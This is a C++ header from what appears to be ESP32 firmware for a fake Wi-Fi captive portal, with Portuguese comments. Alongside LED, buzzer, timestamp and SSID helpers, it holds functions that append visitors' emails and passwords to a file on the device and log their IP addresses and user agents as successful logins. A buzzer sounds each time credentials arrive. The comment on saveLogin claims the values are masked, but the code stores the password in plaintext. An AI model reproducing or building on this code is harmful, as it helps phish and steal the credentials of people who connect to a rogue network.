#ifndef UTILS_H
#define UTILS_H

#include <Arduino.h>
#include <SPIFFS.h>
#include "config.h"

// Forward declarations
String loadSSIDFromConfig();
bool saveSSIDToConfig(String newSSID);
void initializeSSID();

// Variáveis para controle de piscada do LED azul
bool blueLedBlinking = false;
bool blueLedState = false;
unsigned long lastBlinkTime = 0;
unsigned long lastKeepAliveTime = 0;                 // Timestamp do último keepalive recebido
unsigned long currentBlinkInterval = 500;            // Intervalo atual de piscada
const unsigned long NAVIGATION_BLINK_INTERVAL = 500; // 500ms (piscada durante navegação)
const unsigned long KEEPALIVE_TIMEOUT = 5000;        // 5 segundos sem keepalive para parar LED

// Variável global para SSID dinâmico
extern char ssid[33]; // Declaração externa da variável do config.h

// Função para inicializar LEDs
void initializeLeds()
{
    pinMode(LED_PIN, OUTPUT);
    pinMode(GREEN_LED_PIN, OUTPUT);
    pinMode(BUZZER_PIN, OUTPUT);

    digitalWrite(LED_PIN, LOW);
    digitalWrite(GREEN_LED_PIN, HIGH); // LED verde sempre ligado (sistema ativo)
    digitalWrite(BUZZER_PIN, LOW);
}

// Função para iniciar piscada do LED azul durante navegação (500ms)
void startBlueLedBlinking()
{
    blueLedBlinking = true;
    blueLedState = false;
    currentBlinkInterval = NAVIGATION_BLINK_INTERVAL;
    digitalWrite(LED_PIN, LOW);
    lastBlinkTime = millis();
    lastKeepAliveTime = millis(); // Inicializa o timestamp de keepalive
}

// Função para parar piscada do LED azul
void stopBlueLedBlinking()
{
    blueLedBlinking = false;
    lastKeepAliveTime = 0; // Reseta o timestamp de keepalive
    digitalWrite(LED_PIN, LOW);
}

// Função para manter o LED piscando (chamada pelo keepalive do JS)
void keepAliveBlink()
{
    lastKeepAliveTime = millis(); // Atualiza timestamp do último keepalive
    if (!blueLedBlinking)
    {
        Serial.println("LED azul iniciado por keepalive (usuário navegando)");
        startBlueLedBlinking();
    }
    // Se já está piscando, apenas atualiza o timestamp
}

// Função para atualizar piscada do LED azul (deve ser chamada no loop)
void updateBlueLedBlinking()
{
    // Verifica se deve parar por timeout de keepalive
    if (blueLedBlinking && lastKeepAliveTime > 0)
    {
        unsigned long currentTime = millis();
        if (currentTime - lastKeepAliveTime >= KEEPALIVE_TIMEOUT)
        {
            Serial.println("LED azul parado por timeout de keepalive (usuário saiu da página)");
            stopBlueLedBlinking();
            return;
        }
    }

    // Atualiza piscada normal
    if (blueLedBlinking)
    {
        unsigned long currentTime = millis();
        if (currentTime - lastBlinkTime >= currentBlinkInterval)
        {
            blueLedState = !blueLedState;
            digitalWrite(LED_PIN, blueLedState ? HIGH : LOW);
            lastBlinkTime = currentTime;
        }
    }
}

// Função para mascarar entradas, mostrando só 1º e último caractere
String mask(String input)
{
    if (input.length() < 2)
        return "*";
    String result = input.substring(0, 1);
    for (int i = 0; i < input.length() - 2; i++)
        result += "*";
    result += input.substring(input.length() - 1);
    return result;
}

// Salva o email e senha mascarados no arquivo data.txt
void saveLogin(String email, String pass)
{
    File file = SPIFFS.open("/data.txt", FILE_APPEND);
    if (!file)
        return;
    file.printf("Email: %s | Senha: %s\n", email.c_str(), pass.c_str());
    file.close();
}

// Função para obter timestamp atual (baseado no uptime do ESP32)
String getTimestamp()
{
    unsigned long uptime = millis();
    unsigned long totalSeconds = uptime / 1000;
    unsigned long seconds = totalSeconds % 60;
    unsigned long minutes = (totalSeconds / 60) % 60;
    unsigned long hours = (totalSeconds / 3600) % 24;
    unsigned long days = totalSeconds / 86400;

    // Formato simples: DD/MM/AAAA HH:MM:SS baseado no uptime
    // Simula data base de 03/07/2025 + uptime em dias
    int currentDay = 3 + days;
    int currentMonth = 7;
    int currentYear = 2025;

    // Ajustar mês/ano se necessário (básico)
    if (currentDay > 31)
    {
        currentDay = currentDay % 31;
        currentMonth++;
        if (currentMonth > 12)
        {
            currentMonth = 1;
            currentYear++;
        }
    }

    String dateTime = (currentDay < 10 ? "0" : "") + String(currentDay) + "/" +
                      (currentMonth < 10 ? "0" : "") + String(currentMonth) + "/" +
                      String(currentYear) + " " +
                      (hours < 10 ? "0" : "") + String(hours) + ":" +
                      (minutes < 10 ? "0" : "") + String(minutes) + ":" +
                      (seconds < 10 ? "0" : "") + String(seconds);
    return dateTime;
}

// Função para obter apenas a hora (para compatibilidade)
String getTimeOnly()
{
    unsigned long uptime = millis();
    unsigned long seconds = uptime / 1000;
    unsigned long minutes = seconds / 60;
    unsigned long hours = minutes / 60;

    seconds = seconds % 60;
    minutes = minutes % 60;
    hours = hours % 24;

    return String(hours) + ":" + (minutes < 10 ? "0" : "") + String(minutes) + ":" + (seconds < 10 ? "0" : "") + String(seconds);
}

// Função para obter data e hora atual formatada para o dashboard
String getCurrentDateTime()
{
    // Usar a mesma lógica do getTimestamp() para consistência
    return getTimestamp();
}

// Função para obter uptime formatado (DD:HH:MM:SS)
String getUptime()
{
    unsigned long uptime = millis();
    unsigned long totalSeconds = uptime / 1000;
    unsigned long seconds = totalSeconds % 60;
    unsigned long minutes = (totalSeconds / 60) % 60;
    unsigned long hours = (totalSeconds / 3600) % 24;
    unsigned long days = totalSeconds / 86400;

    String result = "";
    if (days > 0)
    {
        result += String(days) + "d ";
    }
    if (hours > 0 || days > 0)
    {
        result += (hours < 10 ? "0" : "") + String(hours) + ":";
    }
    result += (minutes < 10 ? "0" : "") + String(minutes) + ":";
    result += (seconds < 10 ? "0" : "") + String(seconds);

    return result;
}

// Log de acesso à página de login
void logPageAccess(String ip, String userAgent)
{
    File file = SPIFFS.open("/access_logs.txt", FILE_APPEND);
    if (!file)
        return;
    file.printf("[%s] PAGE_ACCESS | IP: %s | UserAgent: %s\n",
                getTimestamp().c_str(), ip.c_str(), userAgent.c_str());
    file.close();
}

// Log de conexão WiFi (clique em conectar)
void logWifiConnection(String ip)
{
    File file = SPIFFS.open("/access_logs.txt", FILE_APPEND);
    if (!file)
        return;
    file.printf("[%s] WIFI_CONNECT | IP: %s\n",
                getTimestamp().c_str(), ip.c_str());
    file.close();
}

// Log de login realizado
void logLoginAttempt(String ip, String userAgent, String email)
{
    File file = SPIFFS.open("/access_logs.txt", FILE_APPEND);
    if (!file)
        return;
    file.printf("[%s] LOGIN_SUCCESS | IP: %s | Email: %s | UserAgent: %s\n",
                getTimestamp().c_str(), ip.c_str(), email.c_str(), userAgent.c_str());
    file.close();
}

// Função para tocar o buzzer e piscar LED quando receber login
void signalLoginReceived()
{
    // Para a piscada temporariamente para o efeito de login
    bool wasBlinking = blueLedBlinking;
    stopBlueLedBlinking();

    // Pisca o LED e toca o buzzer ao receber o login
    tone(BUZZER_PIN, 1000);
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    tone(BUZZER_PIN, 5000);
    digitalWrite(LED_PIN, LOW);
    delay(200);
    tone(BUZZER_PIN, 7000);
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    tone(BUZZER_PIN, 0);
    digitalWrite(LED_PIN, LOW);
    delay(200);

    // Inicia piscada de navegação após login (usuário está na página de sucesso)
    if (wasBlinking)
    {
        startBlueLedBlinking();
    }
}

// Função para carregar SSID do arquivo de configuração
String loadSSIDFromConfig()
{
    File configFile = SPIFFS.open("/config.txt", "r");
    if (configFile)
    {
        while (configFile.available())
        {
            String line = configFile.readStringUntil('\n');
            line.trim();
            if (line.startsWith("SSID="))
            {
                String savedSSID = line.substring(5);
                configFile.close();
                return savedSSID;
            }
        }
        configFile.close();
    }
    return "FUMA"; // Retorna nome padrão se não encontrar
}

// Função para salvar SSID no arquivo de configuração
bool saveSSIDToConfig(String newSSID)
{
    File configFile = SPIFFS.open("/config.txt", "w");
    if (configFile)
    {
        configFile.println("SSID=" + newSSID);
        configFile.close();
        return true;
    }
    return false;
}

// Função para inicializar SSID a partir da configuração salva
void initializeSSID()
{
    String savedSSID = loadSSIDFromConfig();
    if (savedSSID.length() > 0)
    {
        savedSSID.toCharArray(ssid, 33);
        Serial.println("Loaded SSID from config: " + savedSSID);
    }
    else
    {
        // Se não há configuração salva, manter o padrão "FUMA"
        strcpy(ssid, "FUMA");
        Serial.println("Using default SSID: FUMA");
    }
}

#endif
